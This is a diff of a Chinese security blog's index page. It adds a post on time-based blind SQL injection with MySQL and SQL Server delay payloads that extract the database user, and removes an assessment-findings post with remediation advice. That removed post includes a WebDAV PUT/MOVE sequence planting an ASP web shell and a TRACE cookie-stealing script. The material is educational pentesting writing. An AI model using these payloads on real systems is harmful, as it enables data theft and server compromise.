@@ -194,6 +194,90 @@
           
           
             
+              <a class="post-title-link" href="/2015/09/18/SQL注入练级攻略8-延时sql注入脚本/" itemprop="url">
+                SQL注入练级攻略8-延时sql注入脚本
+              </a>
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          发表于
+          <time itemprop="dateCreated" datetime="2015-09-18T16:07:54+08:00" content="2015-09-18">
+            2015-09-18
+          </time>
+        </span>
+
+        
+
+        
+          
+            <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/2015/09/18/SQL注入练级攻略8-延时sql注入脚本/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count ds-thread-count" data-thread-key="2015/09/18/SQL注入练级攻略8-延时sql注入脚本/" itemprop="commentsCount"></span>
+              </a>
+            </span>
+          
+        
+      </div>
+    </header>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        
+          <span itemprop="articleBody"><p>昨天找到个延时注入,sqlmap跑出来数据库类型,试了下sqlmap生成payload好使,就自己动手写一个脚本验证一下.<br>记录下实现过程:</p>
+<h2 id="实现逻辑">实现逻辑</h2><pre><code><span class="keyword">try</span>:
+    发送payload
+    payload = <span class="string">"aaa';sleep(10)"</span>
+    conn = httplib.<span class="type">HTTPConnection</span>(host,timeout = <span class="number">5</span>);
+    conn.request(<span class="keyword">method</span>=<span class="string">"POST"</span>,url=<span class="string">"目标"</span>,body=payload,headers=headers);
+    conn.getresponse()
+    conn.close()
+expect:
+    如果发现异常说明当前payload判断正确
+</code></pre><h2 id="MYSQL相关函数">MYSQL相关函数</h2><p>在mysql中注入payload可能是这样的</p>
+<pre><code>aaa,;<span class="keyword">if</span><span class="params">(ascii<span class="params">(mid<span class="params">(lower<span class="params">(user<span class="params">()</span>)</span>,<span class="number">1</span>,<span class="number">1</span>)</span>,sleep<span class="params">(<span class="number">8</span>)</span>,<span class="number">0</span>)</span>)</span>=<span class="number">97</span>
+</code></pre><p>说明:<br>1.当前用户(user)小写(lower)第一个字母(mid)的ascii码(ascii)等于97时延时(sleep)8秒.<br>2.mid(p1,p2,p3) p1为字符串,p2为起始位置,p3长度<br>3.在python中可以使用ord(“s”)来对应小写字母s的ascii码</p>
+<h2 id="SQLSERVER相关函数">SQLSERVER相关函数</h2><p>在sqlserver中payload可能是这样的</p>
+<pre><code>username=aa';if(ascii(substring(system_user,%d,1))=%d) <span class="operator"><span class="keyword">begin</span> WAITFOR DELAY <span class="string">'0:0:10'</span> <span class="keyword">end</span><span class="comment">--" % (i,ord(s))</span></span>
+</code></pre><p>说明:<br>1.当前用户(system_user)第i个字母(substring)的ascii码(ascii)等于小写字母s对应的ascii码(ord)时,延时(WAITFOR DELAY)10秒.<br>2.substring(p1,p2,p3) p1为字符串,p2为起始位置,p3长度,和mysql中的mid函数功能类似<br>3.ord是python内建函数,其他的函数是在目标数据库中执行的.</p>
+</span>
+        
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+
+      
+      
+        <h1 class="post-title" itemprop="name headline">
+          
+          
+            
               <a class="post-title-link" href="/2015/09/15/邮箱爆破脚本总结/" itemprop="url">
                 邮箱爆破脚本总结
               </a>
@@ -1286,266 +1370,6 @@ php+apache : id = <span class="number">3</span>
 
 
     
-      
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      
-      
-        <h1 class="post-title" itemprop="name headline">
-          
-          
-            
-              <a class="post-title-link" href="/2015/08/18/安全测评反馈记录/" itemprop="url">
-                安全测评反馈记录
-              </a>
-            
-          
-        </h1>
-      
-
-      <div class="post-meta">
-        <span class="post-time">
-          发表于
-          <time itemprop="dateCreated" datetime="2015-08-18T10:11:06+08:00" content="2015-08-18">
-            2015-08-18
-          </time>
-        </span>
-
-        
-
-        
-          
-            <span class="post-comments-count">
-              &nbsp; | &nbsp;
-              <a href="/2015/08/18/安全测评反馈记录/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count ds-thread-count" data-thread-key="2015/08/18/安全测评反馈记录/" itemprop="commentsCount"></span>
-              </a>
-            </span>
-          
-        
-      </div>
-    </header>
-
-    <div class="post-body">
-
-      
-      
-
-      
-        
-          <span itemprop="articleBody"><h2 id="SQL注入">SQL注入</h2><p>等级：紧急</p>
-<p>描述：SQL注入利用现有应用程序，将恶意的SQL命令注入到后台数据库引擎执行，它可以通过在Web表单构造恶意SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句.<br>可以直接或间接的获取数据库内容，危害较大.</p>
-<p>建议：</p>
-<p>1.过滤客户端提交的敏感字符，提交的区域包括：<strong>地址栏中的所有参数，请求头信息，cookie中的参数</strong>，需要过滤的字符如下：<br><code>|</code>–<code>&amp;</code>–<code>;</code>–<code>$</code>–<code>%</code>–<code>@</code>–<code>&#39;</code>;<br><code>&quot;</code>–<code>&lt;</code>–<code>&gt;</code>–<code>(</code>;<code>)</code>–<code>+</code>–<code>CR</code>;<br><code>LF</code>–<code>,</code>–<code>.</code>–<code>select</code>–<code>from</code>;<br><code>update</code>–<code>delete</code>–<code>union</code>–<code>and</code>–<code>or</code>;<br>2.白名单策略：定制允许客户端输入的长度，类型.<br>3.做好数据库用户权限管理，只给用户开放必要权限.</p>
-<h2 id="XSS跨站脚本攻击">XSS跨站脚本攻击</h2><p>1.反射型xss<br>等级：低</p>
-<p>描述：恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的特殊目的.<br>反射型XSS通过给别人发送带有恶意脚本代码参数的URL，当URL地址被打开时，特有的恶意代码参数被HTML解析、执行.<br>它的特点是非持久化，必须用户点击带有特定参数的链接才能引起.</p>
-<p>2.存储型XSS<br>等级：中</p>
-<p>描述：恶意攻击者往Web页面里插入恶意html代码，当用户浏览该页之时，嵌入其中Web里面的html代码会被执行，从而达到恶意攻击用户的特殊目的.<br>存储型XSS通过上传非法代码，当用户触发恶意代码，浏览器就执行攻击者定义的脚本程序.</p>
-<p>建议：<br>  1.对用户输入进行数据合法性验证:</p>
-<table>
-<thead>
-<tr>
-<th>不可信数据将被放置的地方</th>
-<th>例子</th>
-<th>应该采取的编码</th>
-<th>编码格式</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>HTML标签之间</td>
-<td><code>&lt;div&gt; 不可信数据 &lt;/div&gt;</code></td>
-<td>HTML Entity编码</td>
-<td><code>&amp;–&gt;&amp;amp;&lt;–&gt;&amp;lt;&gt;–&gt;&amp;gt;”–&gt;&amp;quot;‘–&gt;&amp;#x27;/–&gt;&amp;#x2f;</code></td>
-</tr>
-<tr>
-<td>HTML标签的属性里</td>
-<td><code>&lt;input type=”text”value=” 不可信数据 ” /&gt;</code></td>
-<td>HTML Attribute编码</td>
-<td><code>&amp;#xHH;</code></td>
-</tr>
-<tr>
-<td>JavaScript标签里</td>
-<td><code>&lt;script&gt; var msg = ” 不可信数据 ” &lt;/script&gt;</code></td>
-<td>JavaScript编码</td>
-<td><code>\xHH</code></td>
-</tr>
-<tr>
-<td>HTML页面的URL里</td>
-<td><code>&lt;a href=”/page?p= 不可信数据 ” &gt;…&lt;/a&gt;</code></td>
-<td>URL编码</td>
-<td><code>%HH</code></td>
-</tr>
-<tr>
-<td>CSS里</td>
-<td><code>div style=” width: 不可信数据 ” &gt; … &lt;/div&gt;</code></td>
-<td>CSS编码</td>
-<td><code>\HH</code></td>
-</tr>
-</tbody>
-</table>
-<p>  2.为Cookie加上HttpOnly标记:<br>  许多XSS攻击的目标就是窃取用户Cookie.<br>窃取Cookie一般都会依赖JavaScript读取 Cookie信息，而HttpOnly标记的cookie不允许被JS操作，这样即使Web应用产生了XSS漏洞，Cookie信息也能得到较好的保护.</p>
-<h2 id="CSRF跨站请求伪造">CSRF跨站请求伪造</h2><p>等级：中</p>
-<p>描述：攻击者盗用用户身份，以用户名义发送恶意请求.<br>CSRF可能造成的危害包括：以用户名义发送邮件，发消息，盗取账号，甚至于购买商品，虚拟货币转账，个人隐私泄露以及财产安全.</p>
-<p>建议：<br>1.验证HTTP Referer字段：<br>验证每一个请求的Referer值，如果来自本站，是合法的.<br>如果Referer是其他网站的话，就有可能是CSRF攻击，则拒绝该请求.</p>
-<p>2.在HTTP请求中以参数的形式(或是通过XMLHttpRequest这个类加到请求头中)加入一个随机产生的token，并在服务器端建立一个拦截器来验证这个token，如果请求中没有token或者token内容不正确，则认为可能是CSRF攻击而拒绝该请求.</p>
-<h2 id="clickjaking点击劫持">clickjaking点击劫持</h2><p>级别：低</p>
-<p>描述：点击劫持是一种视觉上的欺骗手段.<br>攻击者使用一个透明的、不可见的iframe，覆盖在一个网页上，然后诱使用户在该网页上进行操作，此时用户将在不知情 的情况下点击透明的iframe页面.<br>通过调整iframe页面的位置，可以诱使用户恰好点击在iframe页面的一些功能性按钮上.</p>
-<p>建议：在头信息中添加X-FRAME-OPTIONS字段，禁止网站使用ifame载入网页.<br>X-Frame-Options响应头.<br>赋值有如下三种：</p>
-<pre><code><span class="number">1</span>.DENY：不能被嵌入到任何iframe或者frame中.
-
-<span class="number">2</span><span class="class">.SAMEORIGIN</span>:页面只能被本站页面嵌入到iframe或者frame中.
-
-<span class="number">3</span><span class="class">.ALLOW-FROM</span> uri：只能被嵌入到指定域名的框架中.
-</code></pre><p>apache可配置http.conf如下：</p>
-<pre><code><span class="tag">&lt;IfModule headers_module&gt;</span>
-<span class="keyword"><span class="common">Header</span></span> always append X-Frame-Options <span class="string">"DENY"</span>
-<span class="tag">&lt;/IfModule&gt;</span>
-</code></pre><h2 id="页面敏感信息泄露">页面敏感信息泄露</h2><p>级别：视泄露信息而定</p>
-<p>描述：<br>各种不同方式的敏感信息泄露给攻击者提供了信息.</p>
-<p>1.直接访问敏感信息文件<br>2.敏感信息(电话号码，内网IP，邮箱)显示在了页面，源码，url地址中.</p>
-<p>3.返回页面暴漏敏感信息(服务器版本，服务器物理路径…).</p>
-<p>4….发现再补</p>
-<p>建议(一一对应):<br>1.限制对该文件的访问.</p>
-<p>2.确认页面中电话号码，IP用途，站点可根据网站自身情况是否去除号码.<br>3.如果是正常页面中包含路径信息，如果不需要该路径信息，删除该信息.</p>
-<p>  如果是错误信息中包含路径信息，需要屏蔽应用程序错误信息.</p>
-<h2 id="Apache_HTTP_Server_“httpolny”cookie_泄露">Apache HTTP Server “httpolny”cookie 泄露</h2><p>1.为了防止XSS，我们通常采用给cookie附上httponly属性，来禁止js获取cookie.</p>
-<p>2.原理：当Apache接收到了cookie长度超过4k，返回400，并且将所有的cookie信息返回，提示cookie过长.</p>
-<p>3.利用：为用户的cookie添加一些无用信息，总长超过4k，使Apache返回400，并用过js正则过滤掉无用部分，我们就绕过了httponly的设置.</p>
-<p>4.修复：受影响的版本为2.21及其之前的所有版本，做好备份，升级Apache.</p>
-<h2 id="IIS_WebDav_Options_方法未禁用">IIS WebDav Options 方法未禁用</h2><p>1.WebDav是基于HTTP1.1的扩展协议，集成在window xp和IIS中，定义了除了Get，Post等一些http协议基本方法之外的一些方法例如：Option,put,move等.</p>
-<p>2.原理：使用option方法查看服务器允许哪些方法的提交，可能造成安全隐患.</p>
-<p>3.利用：<br>-使用option探测服务器信息：</p>
-<pre><code>OPTIONS/HTTP/<span class="number">1.1</span>
-Host:www<span class="class">.xxxx</span><span class="class">.com</span>
-</code></pre><p>  返回：</p>
-<pre><code>  HTTP/<span class="number">1.1</span> <span class="number">200</span> OK
-  Date:Fri,<span class="number">01</span> Jan <span class="number">2011</span> <span class="number">04</span>:<span class="number">23</span>:<span class="number">39</span> GMT
-  Server: Microsoft-IIS/<span class="number">6.0</span>
-  X-Powered-By:ASP.NET
-  MS-Author-Via:DAV
-  Content-Length:<span class="number">0</span>
-  Accept-Ranges:none
-  DASL:&lt;DAV:sql&gt;
-  DAV:<span class="number">1.2</span>
-Public:OPTION,TRACE,GET,HEAD,DELETE,PUT,POST,COPY,MOVE...
-Cacha-Control:<span class="keyword">private</span>
-</code></pre><p>-上传文本文件：</p>
-<pre><code>PUT<span class="regexp">/test.txt HTTP/</span><span class="number">1.1</span>
-<span class="string">Host:</span>www.xxxx.com
-Content-<span class="string">Length:</span><span class="number">26</span>
-&lt;%eval(request(<span class="string">"cmd"</span>))%&gt;
-</code></pre><p>  返回：</p>
-<pre><code>HTTP/1.1 200 OK
-  Date:Fri,01 Jan 2011 04:23:39 GMT
-  Server: Microsoft-IIS/6.0
-  X-Powered-By:ASP.NET
-location：<span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span>
-Allow:OPTION,TRACE,GET,HEAD,DELETE,PUT,POST,COPY,MOVE...
-//上传成功
-</code></pre><p>-通过MOVE改名(需要IIS勾选允许脚本资源访问复选框)：</p>
-<pre><code>MOVE/test<span class="class">.txt</span> HTTP/<span class="number">1.1</span>
-Host:wwww<span class="class">.xxxx</span><span class="class">.com</span>
-Destination:http:<span class="comment">//www.<span class="label">xxxx.com/webshell.asp</span></span>
-</code></pre><p>  返回：</p>
-<pre><code>HTTP/<span class="number">1.1</span> <span class="number">201</span> Created
-  Date:Fri,<span class="number">01</span> Jan <span class="number">2011</span> <span class="number">04</span>:<span class="number">23</span>:<span class="number">39</span> GMT
-  Server: Microsoft-IIS/<span class="number">6.0</span>
-  X-Powered-By:ASP.NET
-location：www.xxxx.com/webshell.asp
-Content-type:text/xml
-Content-length:<span class="number">0</span>
-<span class="comment">//修改成功</span>
-</code></pre><p>4修复：属于服务器配置不当造成的安全问题，options PUT DELETE MOVE方法如非必须请关闭.</p>
-<h2 id="TRACE_方法未禁用">TRACE 方法未禁用</h2><p>1.TRACE是HTTP协议提供的协议调试方法，发送什么请求，它会将请求原封返回.<br>可能存在的危害是能够与XSS配合获取用户httponly的cookie内容.</p>
-<p>2.原理：客户端JavaScript提出一个TRACE请求，并读取这个请求的响应，那么这段脚本就能够访问标记为HttpOnly的cookie，即使通过document.cookie属性也无法访问它们.</p>
-<p>3.利用：</p>
-<pre><code><span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span>&gt;</span><span class="actionscript">  
-&lt;!--  
-<span class="function"><span class="keyword">function</span> <span class="title">xssTRACE</span><span class="params">()</span></span>{  
-<span class="keyword">var</span> xmlHttp=<span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);  
-xmlHttp.open(<span class="string">"TRACE"</span>,<span class="string">"http://wmjie.51.net/swords/"</span>,<span class="literal">false</span>);  
-xmlHttp.send();  
-xmlDoc=xmlHttp.responseText;  
-alert(xmlDoc);  
-}  
-<span class="comment">//--&gt;  </span>
-</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>  
-<span class="tag">&lt;<span class="title">INPUT</span> <span class="attribute">TYPE</span>=<span class="value">BUTTON</span> <span class="attribute">onClick</span>=<span class="value">"xssTRACE();"</span> <span class="attribute">VALUE</span>=<span class="value">’XSS</span> <span class="attribute">TRACE</span>’&gt;</span>
-//将如上恶意代码插入页面，一个正常用户通过这个被劫持的页面进行访问，即使是设置属性httponly的cookie也通过TRACE方法的请求，显示在返回页面中.
-</code></pre><p>4.修复：属于服务器配置不当造成的安全问题，TRACE方法，如非必须请关闭.</p>
-<h2 id="IIS短文件名泄露">IIS短文件名泄露</h2><p>1.如果网站是运行在IIS服务器上，可以通过”~”来发现一些文件和文件夹,攻击者可以发现重要的文件或者文件夹，如果这些文件或者文件夹是正规的可见文件.攻击者可以通过该途径搜集文件名称(字符长度不超过6).<br>2.原理：使用通配符<code>*</code>和<code>?</code>发送一个请求到iis,当IIS接收到一个文件路径中包含”~”的请求时，它的反应是不同的.基于这个特点，我们可以根据http的响应区分一个可用或者不可用的文件.<br>3.修复：</p>
-<ul>
-<li><p>过滤<code>~</code>字符.</p>
-</li>
-<li><p>Windows中禁用8.3格式文件名方法如下(此修改只能禁止NTFS8.3格式文件名创建,已经存在的文件的短文件名无法移除)：</p>
-<p>  cmd&gt; fsutil 8dot3name query c:<br>“c:”表示查询C盘的状态.<br>如果功能被启用，会显示类似如下的信息：</p>
-<p>  Disable8dot3 的卷状态为 0 (8dot3 名称创建已启用).<br>  NtfsDisable8dot3NameCreation 的注册表状态为默认值 2 (卷级别设置).<br>  基于以上的两个设置，在 c: 上启用 8dot3 名称创建.</p>
-</li>
-</ul>
-<p>如果在C盘上关闭这个功能，则可使用以下命令：</p>
-<pre><code>cmd&gt; fsutil <span class="number">8</span>dot3name <span class="built_in">set</span> C: <span class="number">1</span>
-<span class="comment">//0（全部启动），1（全部禁用），2（每个盘符单独设置），3（除系统盘外全部禁用）.</span>
-</code></pre><p>也可以通过修改注册表实现：</p>
-<pre><code>键：HKLM<span class="command">\SYSTEM</span><span class="command">\CurrentControlSet</span><span class="command">\Control</span><span class="command">\FileSystem</span>
-值：NTFSDisable8dot3NameCreation  类型：REG_DWORD
-</code></pre><ul>
-<li>使用waf进行防护.</li>
-</ul>
-<h2 id="会话标识别未更新">会话标识别未更新</h2><p>1.会话标识别未更新</p>
-<p>2.原理：用户的登录页面会有一个session id，登录成功后，应该使用新的session id 而不是保持登录页面的session id， 这样即使别人在网络上截获了你的登录页面的session id，仍然无法伪造客户身份进入系统.<br>如果使用同样的session id，则可能被截获并且伪造客户身份进入系统.</p>
-<p>3.修复：<br>-始终生成新的会话，供用户成功认证时登录.<br>-防止用户操纵会话标识.<br>-请勿接受用户浏览器登录时所提供的会话标识.</p>
-<h2 id="敏感信息泄露">敏感信息泄露</h2><p>1.以电话号码泄露为例</p>
-<p>2.原理：敏感信息(电话号码，内网IP)显示在了页面，源码，url地址中.</p>
-<p>3.利用：可作为进一步渗透的信息储备</p>
-<p>4.修复：此号码网站业务正常，无实际安全影响，站点可根据网站自身情况是否去除号码.</p>
-<h2 id="缺少httponly属性">缺少httponly属性</h2><p>1.会话cookie中缺少HttpOnly属性会导致攻击者可以通过程序(JS脚本、Applet等)获取到用户的cookie信息，造成用户cookie信息泄露，增加攻击者的跨站脚本攻击威胁.</p>
-<p>2.修复：<br>向所有会话cookie中添加“HttpOnly”属性.</p>
-<pre><code>Java示例：
-HttpServletResponse response2 = (HttpServletResponse)<span class="built_in">response</span>;
-response2.setHeader( <span class="string">"Set-Cookie"</span>, <span class="string">"name=value; HttpOnly"</span>); 
-
-C#示例：
-HttpCookie myCookie = <span class="keyword">new</span> HttpCookie(<span class="string">"myCookie"</span>); 
-myCookie.HttpOnly = <span class="literal">true</span>; 
-<span class="built_in">Response</span>.AppendCookie(myCookie);
-
-VB.NET示例：
-<span class="keyword">Dim</span> myCookie As HttpCookie = <span class="keyword">new</span> HttpCookie(<span class="string">"myCookie"</span>) 
-myCookie.HttpOnly = <span class="literal">True</span> 
-<span class="built_in">Response</span>.AppendCookie(myCookie) 
-</code></pre><h2 id="启用不安全的HTTP方法">启用不安全的HTTP方法</h2><p>1.检测到目标Web服务器配置成允许下列其中一个（或多个）HTTP 方法：DELETE, SEARCH,COPY,MOVE, PROPFIND, PROPPATCH, MKCOL ,LOCK ,UNLOCK.这些方法表示可能在服务器上使用了 WebDAV.由于dav方法允许客户端操纵服务器上的文件，如果没有合理配置dav，有可能允许未授权的用户对其进行利用，修改服务器上的文件.<br>2.利用：<br>参考：</p>
-<blockquote>
-<p>IIS WebDav Options 方法未禁用</p>
-</blockquote>
-<p>3.修复：<br>如果服务器不需要支持WebDAV，请禁用.<br>或者为允许webdav的目录配置严格的访问权限，如认证方法，认证需要的用户名，密码.</p>
-<h2 id="目标web应用表单密码类型输入启用了自动完成操作">目标web应用表单密码类型输入启用了自动完成操作</h2><p>1.在web应用form表单中，如果input标签没有指定“autocomplete”属性为“off”，则“autocomplete”的属性会自动默认为“on”.<br>当web应用form表单中的密码类型的input标签的“autocomplete”属性为“on”时，用户若提交了一个新的用户名和密码时，浏览器将会询问用户是否保存该用户名和密码信息.<br>如果用户选择保存，则之后在显示该web应用表单时，用户名和密码将会被自动填充到对应的输入框中.<br>用户一但保存密码，攻击者就可以通过本地从浏览器缓存中获取明文密码，导致用户敏感信息泄露.</p>
-<p>2.修复：<br>修改web应用form表单中密码类型input标签的“autocomplete”属性为“off”.</p>
-<p>示例：</p>
-<pre><code>&lt;input <span class="class"><span class="keyword">type</span></span>=<span class="string">"password"</span> name=<span class="string">"password"</span>&gt;
-则增加“autocomplete”属性为“off”即可，修改为：
-&lt;input <span class="class"><span class="keyword">type</span></span>=<span class="string">"password"</span> name=<span class="string">"password"</span> autocomplete=<span class="string">"off"</span>&gt;
-</code></pre></span>
-        
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -1584,7 +1408,7 @@ myCookie.HttpOnly = <span class="literal">True</span>
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">44</span>
+              <span class="site-state-item-count">45</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -1598,7 +1422,7 @@ myCookie.HttpOnly = <span class="literal">True</span>
 
           <div class="site-state-item site-state-tags">
             <a href="/tags">
-              <span class="site-state-item-count">36</span>
+              <span class="site-state-item-count">37</span>
               <span class="site-state-item-name">标签</span>
               </a>
           </div>
@@ -1661,7 +1485,7 @@ myCookie.HttpOnly = <span class="literal">True</span>
       <div class="footer-inner"> <div class="copyright" >
   
   &copy; &nbsp; 
-  <span itemprop="copyrightYear">2015</span>
+  <span itemprop="copyrightYear">2016</span>
   <span class="with-love">
     <i class="icon-next-heart"></i>
   </span>
